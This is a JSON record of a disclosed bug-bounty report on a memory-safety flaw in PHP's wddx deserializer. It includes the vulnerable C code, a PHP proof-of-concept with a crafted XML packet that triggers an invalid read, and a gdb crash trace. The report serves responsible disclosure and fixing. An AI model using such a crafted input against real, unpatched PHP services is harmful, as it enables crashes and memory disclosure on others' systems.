{
  "id": 188661,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODg2NjE=",
  "url": "https://hackerone.com/reports/188661",
  "title": "Invalid read when wddx decodes empty boolean element",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2016-12-06T09:01:56.225Z",
  "submitted_at": "2016-12-06T09:01:56.225Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fosec",
    "url": "/fosec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVTTDODC5%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122922Z&X-Amz-Expires=1757&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID693ry3aCpgBNFsLct8mX9l7wvdQVVWmYvwUqQvdF7KAiAdSWhaIMNlELgXMB1NayYXnCw6MIPveltDKhf1Pi%2B%2BTyqwBQhwEAMaDDAxMzYxOTI3NDg0OSIMeqywxoUQIynbQlHaKo0Fe46aHEdpcC3YOcWFSo5%2FPlZo075PznbuWjwixp8hH9KoO504Zlpv8JLUnFg74E6gJX2Pzn6degdSTgZnR5pabWfzyUK8VgXDaKbyAFRNB%2FyiW7CL8buOijnGB5LMGC5Ub%2F9PQMqeJNBBXAPsrE2UmPn5gjwK%2BcmefaWW6Om1oc0S1AV3aRbhGGvIClMNowpzTKwY2cJTazvo68YT8nj3r309uf6oeoYAkiKsNrl%2BjkyZbeoLxh7SHRp8LKYpVp0AUljQRc7ju8bMAnPrwLNpjmKCItKxSTuRi5VImCSNPx09yJCbKX96Xvw6RTIGCqXL00kHQirGwcGSECVbRwBXyqwSrUnWLlWDhKOIoR4uRBX%2FrJncOHzHnBjG88wj4DZCIWvtRO6lIJiVTjHHbovQsiiJCR0CJXmjYGVNWnw4STKNqENdThA%2BoAV93oc6KqslrIJmA3%2FWJ3hHDu6iH0QRCr%2BjD8ov4r9%2FYkW5PGztwXFMNbLy4f6rp9yO2cASIidty2s2Mwgg77tW2G6y2AjRt54do8MP%2FrgBf7esv1UwT6fQ6XjsyzN3TqTaKSluaLLWRsx0Id1DPlYH8SlSQ9%2Fs99pLiQ2Sn5jTbGhNv3VI5HN9xkY6JRZOgOatpa6LQ2W9vfAbDtFPcM2bXjMi0BjYPrupuQyWaBoKitSLtA8lcpnkoeQMpvieH4lXp25sDLR2uj1DbhZCb9f3xGyqmq2BVWWkEikHPubnbBcz6S%2B3llBAPkBgkclDIYxgcNz%2FsUjcCG5IDos27e%2BJdPmqBJfx%2BJ%2BYUFK89%2BU4mf8c1lZt7Jc%2Fk9AQ0ddyoy6T8ONZB0MJiUW0NWWnVen9QrW3kc6QcKD746D2hijmtUanVoow%2FZ2srgY6sgFwqSMrw5iR24CiM4ABdXApjpqkvMnlPO0VHwff6rzOhZ30z96Ny68KEUlqUgm3VT%2F4GLbY4JggAV2nXvLhY1y%2FwS5H0X633oYXQkKXO4zi4dxnYqgtqo9JA3MGCN3%2FIA87gZovDG5MZKsJRKCek87Fz6I78w%2BmgpQE0H%2FeDHHGMzt2%2BHwXcAXSOO8R7zQrGHfPfRZTdnYt8bnek5BsbmnxSNcyVmYaIFqhXHYmXyHFbmZM&X-Amz-SignedHeaders=host&X-Amz-Signature=6a0bb17fa258a74a1b5a58c34587045a055f8a75754a6ee1aba5259a663d5289",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVTTDODC5%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122922Z&X-Amz-Expires=1757&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID693ry3aCpgBNFsLct8mX9l7wvdQVVWmYvwUqQvdF7KAiAdSWhaIMNlELgXMB1NayYXnCw6MIPveltDKhf1Pi%2B%2BTyqwBQhwEAMaDDAxMzYxOTI3NDg0OSIMeqywxoUQIynbQlHaKo0Fe46aHEdpcC3YOcWFSo5%2FPlZo075PznbuWjwixp8hH9KoO504Zlpv8JLUnFg74E6gJX2Pzn6degdSTgZnR5pabWfzyUK8VgXDaKbyAFRNB%2FyiW7CL8buOijnGB5LMGC5Ub%2F9PQMqeJNBBXAPsrE2UmPn5gjwK%2BcmefaWW6Om1oc0S1AV3aRbhGGvIClMNowpzTKwY2cJTazvo68YT8nj3r309uf6oeoYAkiKsNrl%2BjkyZbeoLxh7SHRp8LKYpVp0AUljQRc7ju8bMAnPrwLNpjmKCItKxSTuRi5VImCSNPx09yJCbKX96Xvw6RTIGCqXL00kHQirGwcGSECVbRwBXyqwSrUnWLlWDhKOIoR4uRBX%2FrJncOHzHnBjG88wj4DZCIWvtRO6lIJiVTjHHbovQsiiJCR0CJXmjYGVNWnw4STKNqENdThA%2BoAV93oc6KqslrIJmA3%2FWJ3hHDu6iH0QRCr%2BjD8ov4r9%2FYkW5PGztwXFMNbLy4f6rp9yO2cASIidty2s2Mwgg77tW2G6y2AjRt54do8MP%2FrgBf7esv1UwT6fQ6XjsyzN3TqTaKSluaLLWRsx0Id1DPlYH8SlSQ9%2Fs99pLiQ2Sn5jTbGhNv3VI5HN9xkY6JRZOgOatpa6LQ2W9vfAbDtFPcM2bXjMi0BjYPrupuQyWaBoKitSLtA8lcpnkoeQMpvieH4lXp25sDLR2uj1DbhZCb9f3xGyqmq2BVWWkEikHPubnbBcz6S%2B3llBAPkBgkclDIYxgcNz%2FsUjcCG5IDos27e%2BJdPmqBJfx%2BJ%2BYUFK89%2BU4mf8c1lZt7Jc%2Fk9AQ0ddyoy6T8ONZB0MJiUW0NWWnVen9QrW3kc6QcKD746D2hijmtUanVoow%2FZ2srgY6sgFwqSMrw5iR24CiM4ABdXApjpqkvMnlPO0VHwff6rzOhZ30z96Ny68KEUlqUgm3VT%2F4GLbY4JggAV2nXvLhY1y%2FwS5H0X633oYXQkKXO4zi4dxnYqgtqo9JA3MGCN3%2FIA87gZovDG5MZKsJRKCek87Fz6I78w%2BmgpQE0H%2FeDHHGMzt2%2BHwXcAXSOO8R7zQrGHfPfRZTdnYt8bnek5BsbmnxSNcyVmYaIFqhXHYmXyHFbmZM&X-Amz-SignedHeaders=host&X-Amz-Signature=7f7ddd35955a8b961a3bff97e62eaf4420d36a6b8dc614834470a652fe8c7273"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:20:07.865Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:20:06.268Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Description\n-----------\nI have found some vulnerable code in wddx extension. The trouble happens when trying to process 'boolean' tag. If I open <boolean> tag without data, new st_entry item WILL NOT be pushed into stack. When <boolean> tag is closed and stack->top is greater than 1, st_entry item at top of stack WILL be popped out of stack.\n\nLook at following snip code, a new st_entry will be pushed into stack if atts is not NULL. If I open <boolean> tag by using '<boolean/>', 'atts' is NULL.\n\n``` c\nstatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n\t.....\n\t} else if (!strcmp((char *)name, EL_BOOLEAN)) {\n\t\tint i;\n\n\t\tif (atts) for (i = 0; atts[i]; i++) {\n\t\t\tif (!strcmp((char *)atts[i], EL_VALUE) && atts[i+1] && atts[i+1][0]) {\n\t\t\t\tent.type = ST_BOOLEAN;\n\t\t\t\tSET_STACK_VARNAME;\n\n\t\t\t\tZVAL_TRUE(&ent.data);\n\t\t\t\twddx_stack_push((wddx_stack *)stack, &ent, sizeof(st_entry));\n\t\t\t\tphp_wddx_process_data(user_data, atts[i+1], strlen((char *)atts[i+1]));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t} \n    .....\n}\n```\n\nLook at the other snip code, I see \"boolean\" tag is popped and freed without checking anything:\n\n``` c\nstatic void php_wddx_pop_element(void *user_data, const XML_Char *name)\n{\n\tst_entry \t\t\t*ent1, *ent2;\n\twddx_stack \t\t\t*stack = (wddx_stack *)user_data;\n\n\n\tif (!strcmp((char *)name, EL_STRING) || !strcmp((char *)name, EL_NUMBER) ||\n\t\t!strcmp((char *)name, EL_BOOLEAN) || !strcmp((char *)name, EL_NULL) ||\n\t  \t!strcmp((char *)name, EL_ARRAY) || !strcmp((char *)name, EL_STRUCT) ||\n\t\t!strcmp((char *)name, EL_RECORDSET) || !strcmp((char *)name, EL_BINARY) ||\n\t\t!strcmp((char *)name, EL_DATETIME)) {\n\t\twddx_stack_top(stack, (void**)&ent1);\n\t\t...\n\n\t\tif (stack->top > 1) {\n\t\t\tstack->top--;\n\t\t\twddx_stack_top(stack, (void**)&ent2);\n            .....\n\t\t\tefree(ent1);\n\t\t} else {\n\t\t\tstack->done = 1;\n\t\t}\n\t}\n    ....\n}\n```\n\nTest script\n-----------\n``` php\n<?php\n$xml = <<<EOF\n<?xml version=\"1.0\" ?>\n<wddxPacket version=\"1.0\">\n<number>2261634.5098039215</number>\n<binary><boolean/></binary>\n</wddxPacket>\nEOF;\n$wddx = wddx_deserialize($xml);\nvar_dump($wddx);\n?>\n```\n\nWhen processing `binary` tag, a `st_entry` which describes `binary` tag is pushed to stack. `<boolean/>` will lead to `st_entry` of `binary` tag is popped out. When processing `</binary>`, `php_wddx_pop_element()` function is called. `php_wddx_pop_element` will take top of stack and use it as a string object, try to decode it. We can use this issue to read anything at anywhere. If this value is not a valid memory address, it will lead to memory corruption.\n\nBelow backtrace of gdb will give you details.\n\n```\n[-------------------------------------code-------------------------------------]\n   0x82cf418 <php_wddx_pop_element+440>:        mov    eax,DWORD PTR [ebx]\n=> 0x82cf41a <php_wddx_pop_element+442>:        mov    edx,DWORD PTR [eax+0xc]\n   0x82cf41d <php_wddx_pop_element+445>:        add    eax,0x10\n   0x82cf420 <php_wddx_pop_element+448>:        mov    DWORD PTR [esp],eax\n   0x82cf423 <php_wddx_pop_element+451>:        mov    DWORD PTR [esp+0x4],edx\n   0x82cf427 <php_wddx_pop_element+455>:        call   0x82702f0 <php_base64_decode>\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbce0 --> 0x89b92d4 (\"boolean\")\n0004| 0xbfffbce4 --> 0xb7870080 --> 0x0\n0008| 0xbfffbce8 --> 0x89b8568 --> 0x8931938 --> 0x0\n0012| 0xbfffbcec --> 0xb7c66458 (<__GI___libc_malloc+8>:        add    ebx,0x140ba8)\n0016| 0xbfffbcf0 --> 0xb7f1e000 --> 0x15adac\n0020| 0xbfffbcf4 --> 0xb7d371bf (<__memcpy_ssse3_rep+31>:       add    ebx,0x31501)\n0024| 0xbfffbcf8 --> 0xb7f1e000 --> 0x15adac\n0028| 0xbfffbcfc --> 0xb7e6409b (<xmlStrndup__internal_alias+75>:       mov    eax,edi)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\nphp_wddx_pop_element (user_data=0xbfffbf6c, name=<optimized out>) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n905                             zend_string *new_str = php_base64_decode(\ngdb-peda$ bt\n#0  php_wddx_pop_element (user_data=0xbfffbf6c, name=<optimized out>) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n#1  0x082d602b in _end_element_handler (user=0xb7870080, name=0x89b92cd \"binary\") at /root/fuzzer/PHP-7.1/ext/xml/compat.c:219\n#2  0xb7df9302 in xmlParseEndTag1 (ctxt=ctxt@entry=0x89b8568, line=line@entry=0x0) at parser.c:8796\n#3  0xb7e01c89 in xmlParseTryOrFinish (ctxt=ctxt@entry=0x89b8568, terminate=terminate@entry=0x1) at parser.c:11743\n#4  0xb7e02da3 in xmlParseChunk__internal_alias (ctxt=0x89b8568,\n    chunk=chunk@entry=0xb78661f0 \"<?xml version=\\\"1.0\\\" ?>\\r\\n<wddxPacket version=\\\"1.0\\\">\\r\\n<number>2261634.5098039215</number>\\r\\n<binary><boolean/></binary>\\r\\n</wddxPacket>\", size=size@entry=0x83,\n    terminate=terminate@entry=0x1) at parser.c:12446\n#5  0x082d6336 in php_XML_Parse (parser=parser@entry=0xb7870080,\n    data=data@entry=0xb78661f0 \"<?xml version=\\\"1.0\\\" ?>\\r\\n<wddxPacket version=\\\"1.0\\\">\\r\\n<number>2261634.5098039215</number>\\r\\n<binary><boolean/></binary>\\r\\n</wddxPacket>\", data_len=data_len@entry=0x83,\n    is_final=is_final@entry=0x1) at /root/fuzzer/PHP-7.1/ext/xml/compat.c:600\n#6  0x082d1904 in php_wddx_deserialize_ex (\n    value=value@entry=0xb78661f0 \"<?xml version=\\\"1.0\\\" ?>\\r\\n<wddxPacket version=\\\"1.0\\\">\\r\\n<number>2261634.5098039215</number>\\r\\n<binary><boolean/></binary>\\r\\n</wddxPacket>\", vallen=0x83,\n    return_value=return_value@entry=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1095\n#7  0x082d1ba7 in zif_wddx_deserialize (execute_data=0xb78140b0, return_value=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1313\n#8  0x0838b6c6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:675\n#9  0x0837c322 in execute_ex (ex=0xb7814020) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:429\n#10 0x083cb3bb in zend_execute (op_array=op_array@entry=0xb7865180, return_value=return_value@entry=0x0) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:474\n#11 0x0833bb40 in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/fuzzer/PHP-7.1/Zend/zend.c:1474\n#12 0x082dd0cb in php_execute_script (primary_file=primary_file@entry=0xbfffe2b8) at /root/fuzzer/PHP-7.1/main/main.c:2533\n#13 0x083cd70a in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:990\n#14 0x0806d544 in main (argc=0x3, argv=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:1378\n#15 0xb7c07943 in __libc_start_main (main=0x806d070 <main>, argc=0x3, ubp_av=0xbffff564, init=0x83d5260 <__libc_csu_init>, fini=0x83d52d0 <__libc_csu_fini>, rtld_fini=0xb7fee700 <_dl_fini>,\n    stack_end=0xbffff55c) at libc-start.c:274\n#16 0x0806d5d1 in _start ()\ngdb-peda$ i r $eax\neax            0x41414141       0x41414141\ngdb-peda$\n```",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:20:06.389Z",
  "allow_singular_disclosure_after": -134276955.89124838,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "spetr0x"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
